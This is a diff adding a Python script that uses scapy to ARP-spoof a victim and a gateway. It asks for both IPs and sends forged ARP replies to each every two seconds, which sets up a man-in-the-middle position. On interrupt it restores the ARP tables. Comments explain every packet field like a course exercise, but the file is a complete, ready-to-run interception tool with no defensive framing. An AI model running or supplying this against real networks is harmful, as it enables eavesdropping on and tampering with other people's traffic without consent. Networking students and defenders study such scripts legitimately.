@@ -1,0 +1,70 @@
+#!/usr/bin/python
+
+import scapy.all as scapy
+#scapy.show(scapy.ARP) - will show all the fields in ARP
+#scapy.summary(instance) - will show what is happening with the instance
+
+import time
+import sys
+
+
+def get_mac(target_ip):
+    arp_request = scapy.ARP(pdst=target_ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+
+    # This will only access the first tuple - which will contain the info about target_ip packet
+    # The second element within the tuple will contain the MAC - which we access with .hwsrc
+    mac = answered_list[0][1].hwsrc
+    return mac
+
+
+def spoof(target_ip, spoof_ip):
+    # This will modify the packet fields -
+    # op = 2 --- sends a RESPONSE packet - is-at
+    # pdst -> IP for the destination - the victim IP
+    # hwdst -> MAC for the destination - the victim MAC
+    # psrc -> what we are telling the victim where the source IP of the packet is - the router
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+
+    # The verbose false will not display the scapy output "1 packet sent"
+    scapy.send(packet, verbose=False)
+
+# This will restore the victim arp tables to normal
+# In the spoof fn we did not specify souce mac because scapy automatically sends our MAC
+# Need to specify the mac of the source IP in order to restore to normal
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
+
+
+target_ip = raw_input("Enter Victim IP > ")
+gateway_ip = raw_input("Enter Gateway IP > ")
+
+# Continuously send the spoof packets with a 2 second delay
+try:
+    sent_packets_count = 0
+    while True:
+        spoof(gateway_ip, target_ip)
+        spoof(target_ip, gateway_ip)
+        sent_packets_count += 2
+
+        # Print automatically adds a newline character
+        # The flush will get rid of the newline, and print everything on the same line
+        # The \r will inform python to print at the start of the line (overwriting previous print)
+        print("\r[+] sent {} packets".format(sent_packets_count)),
+        sys.stdout.flush()
+
+        # For python3
+        # print("\r[+] sent {} packets".format(sent_packets_count), end="")
+
+        time.sleep(2)
+
+except KeyboardInterrupt:
+    print("\nProgram Terminated -- Resetting ARP Tables - please wait")
+    restore(gateway_ip, target_ip)
+    restore(target_ip, gateway_ip)
